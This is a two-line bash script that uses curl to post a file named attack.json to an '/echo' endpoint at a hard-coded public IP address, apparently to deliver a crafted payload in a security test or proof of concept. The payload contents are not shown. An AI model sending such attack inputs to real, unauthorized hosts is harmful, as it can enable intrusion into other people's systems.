#!/bin/bash

curl -H"content-type: application/json" -d@attack.json http://35.211.53.53:8000/echo
